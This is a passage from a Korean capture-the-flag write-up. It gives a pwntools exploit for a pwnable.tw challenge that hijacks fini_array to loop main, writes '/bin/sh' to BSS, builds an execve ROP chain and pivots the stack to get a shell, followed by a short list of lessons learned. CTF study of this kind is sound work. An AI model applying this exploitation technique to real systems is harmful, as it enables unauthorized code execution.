## 익스플로잇 코드

```python
from pwn import *

p = remote("chall.pwnable.tw", 10105)

main          = 0x401b6d
fini_array    = 0x4b40f0
fini_array_call = 0x402960
bss           = 0x4b92e0

pop_rdi   = 0x401696
pop_rsi   = 0x406c30
pop_rdx   = 0x446e35
pop_rax   = 0x41e4af
pop_rbp   = 0x401b2d
syscall   = 0x4022b4
leave_ret = 0x401c4b

# execve("/bin/sh", 0, 0) syscall을 위한 ROP chain
ROP = [
    p64(pop_rdi), p64(bss),    # rdi = "/bin/sh" 주소
    p64(pop_rsi), p64(0),      # rsi = 0
    p64(pop_rdx), p64(0),      # rdx = 0
    p64(pop_rax), p64(0x3b),   # rax = 59 (execve syscall 번호)
    p64(syscall)
]

def write(addr, data):
    p.sendafter("addr:", str(addr).encode())
    p.sendafter("data:", data)

# 1. fini_array에 루프 설정 (프로그램 종료 시 main으로 돌아오게)
write(fini_array, p64(fini_array_call) + p64(main))

# 2. BSS에 "/bin/sh" 문자열 작성
write(bss, b"/bin/sh\x00")

# 3. BSS+0x10부터 ROP chain 작성 (3개씩 나눠서)
for i in range(3):
    write(fini_array + 0x10 + (i * 0x18),
          ROP[3*i] + ROP[1 + 3*i] + ROP[2 + 3*i])

# 4. Stack pivot: fini_array[0]을 leave_ret으로 덮어 BSS로 스택 이동
write(fini_array, p64(leave_ret) + p64(pop_rdi + 1))  # +1은 ret (스택 정렬)

p.interactive()  # 셸 획득
```

---

## 배운 점

- 제한된 쓰기 횟수를 우회하기 위해 `fini_array_call + main`으로 반복 실행 구조를 만드는 아이디어
- Stack Pivot(`leave; ret`)을 적용하여 RBP 조작을 통해 스택 위치를 임의로 변경
- 정적 링크 바이너리에서는 libc 없이도 바이너리 내부에 충분한 가젯이 존재
